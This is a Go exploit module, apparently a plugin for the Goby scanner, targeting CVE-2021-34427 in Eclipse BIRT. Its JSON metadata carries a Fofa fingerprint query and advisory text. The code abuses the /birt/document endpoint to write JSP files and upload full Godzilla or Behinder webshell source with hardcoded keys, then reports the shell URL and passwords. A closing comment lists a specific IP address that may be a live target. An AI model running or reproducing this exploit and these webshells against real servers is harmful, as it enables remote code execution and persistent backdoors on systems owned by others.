package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Eclipse BIRT document sample Arbitrary File Upload Vulnerability (CVE-2021-34427)",
    "Description": "<p>Eclipse BIRT is a set of open source software provided by the Eclipse Foundation to provide reporting and business intelligence functions for rich client applications and Web applications.</p><p>There is a code problem vulnerability in Eclipse BIRT. The vulnerability stems from the fact that in Eclipse BIRT version 4.8.0 and earlier, query parameters can be used to create a JSP file that can be accessed remotely (the current BIRT viewer dir), and an attacker can upload Malicious Trojans gain server privileges.</p>",
    "Product": "Eclipse-BIRT",
    "Homepage": "https://eclipse.org/",
    "DisclosureDate": "2021-06-09",
    "Author": "h1ei1",
    "FofaQuery": "title=\"Eclipse BIRT Home\" || body=\"/birt/images\" || body=\"Business Intelligence Reporting Tool\"",
    "GobyQuery": "title=\"Eclipse BIRT Home\" || body=\"/birt/images\" || body=\"Business Intelligence Reporting Tool\"",
    "Level": "3",
    "Impact": "<p>There is a code problem vulnerability in Eclipse BIRT. The vulnerability stems from the fact that in Eclipse BIRT version 4.8.0 and earlier, query parameters can be used to create a JSP file that can be accessed remotely (the current BIRT viewer dir), and an attacker can upload Malicious Trojans gain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please visit the manufacturer's homepage: <a href=\"https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142.\">https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142.</a></p>",
    "References": [
        "https://sec-consult.com/vulnerability-lab/advisory/remote-code-execution-bypass-eclipse-business-intelligence-reporting-birt/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\"); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2021-34427"
    ],
    "CNNVD": [
        "CNNVD-202106-1740"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Eclipse BIRT 软件 document 文件 sample 参数任意文件上传漏洞 （CVE-2021-34427）",
            "Product": "Eclipse-BIRT",
            "Description": "<p>Eclipse BIRT是Eclipse基金会的一套为富客户端应用和Web应用提供报表和商业智能功能的开源软件。<br></p><p>Eclipse BIRT 存在代码问题漏洞，该漏洞源于在Eclipse BIRT版本4.8.0及更早的版本中，可以使用查询参数创建一个可以从远程(当前BIRT查看器dir)访问的JSP文件，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142\">https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142</a>。<br></p>",
            "Impact": "<p>Eclipse BIRT 存在代码问题漏洞，该漏洞源于在Eclipse BIRT版本4.8.0及更早的版本中，可以使用查询参数创建一个可以从远程(当前BIRT查看器dir)访问的JSP文件，攻击者可上传恶意木马获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Eclipse BIRT document sample Arbitrary File Upload Vulnerability (CVE-2021-34427)",
            "Product": "Eclipse-BIRT",
            "Description": "<p>Eclipse BIRT is a set of open source software provided by the Eclipse Foundation to provide reporting and business intelligence functions for rich client applications and Web applications.<br></p><p>There is a code problem vulnerability in Eclipse BIRT. The vulnerability stems from the fact that in Eclipse BIRT version 4.8.0 and earlier, query parameters can be used to create a JSP file that can be accessed remotely (the current BIRT viewer dir), and an attacker can upload Malicious Trojans gain server privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please visit the manufacturer's homepage: <a href=\"https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142.\">https://bugs.eclipse.org/bugs/show_bug.cgi?id=538142.</a><br></p>",
            "Impact": "<p>There is a code problem vulnerability in Eclipse BIRT. The vulnerability stems from the fact that in Eclipse BIRT version 4.8.0 and earlier, query parameters can be used to create a JSP file that can be accessed remotely (the current BIRT viewer dir), and an attacker can upload Malicious Trojans gain server privileges.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10839"
}`

	sendPayloadGR16eiYF := func(hostInfo *httpclient.FixUrl, fileName, payload string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig("/birt/document?__report=test.rptdesign&sample=<@urlencode_all>" + url.QueryEscape(payload) + "<@/urlencode_all>&__document=./test/" + fileName + ".jsp")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	checkFileGR16eiYF := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig("/birt/test/" + uri + ".jsp")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randFileName := goutils.RandomHexString(6)
			checkStr := goutils.RandomHexString(16)
			_, err := sendPayloadGR16eiYF(hostInfo, randFileName, "<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\""+base64.StdEncoding.EncodeToString([]byte(checkStr))+"\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>")
			if err != nil {
				return false
			}
			respCheck, errCheck := checkFileGR16eiYF(hostInfo, randFileName)
			return errCheck == nil && (respCheck != nil && respCheck.StatusCode == 200) && strings.Contains(respCheck.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			randFileName := goutils.RandomHexString(6)
			if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				content := goutils.B2S(stepLogs.Params["content"])
				if webshell == "godzilla" {
					content = "<%! String xc=\"3c6e0b8a9c15224a\"; String pass=\"pass\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}\n%>"
				} else if webshell == "behinder" {
					content = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
				}
				respWebshell, err := sendPayloadGR16eiYF(expResult.HostInfo, randFileName, content)
				if !(err == nil && (respWebshell != nil && respWebshell.StatusCode == 200) && strings.Contains(respWebshell.Utf8Html, "The report document file has been generated successfully.")) {
					return expResult
				}
				respCheckShell, err := checkFileGR16eiYF(expResult.HostInfo, randFileName)
				if !(err == nil && respCheckShell != nil && (respCheckShell.StatusCode == 200 || respCheckShell.StatusCode == 500)) {
					return expResult
				}
				expResult.Success = true
				if webshell == "custom" {
					expResult.Output = "File URL: " + expResult.HostInfo.FixedHostInfo + "/birt/test/" + randFileName + ".jsp"
					return expResult
				}
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/birt/test/" + randFileName + ".jsp\n"
				if webshell == "godzilla" {
					expResult.Output += "密码: pass\n密钥：key\n加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				}
				expResult.Output += "Webshell type: jsp"
			}
			return expResult
		},
	))
}

//hunter近一年资产：1326
//https://203.210.84.175:9999
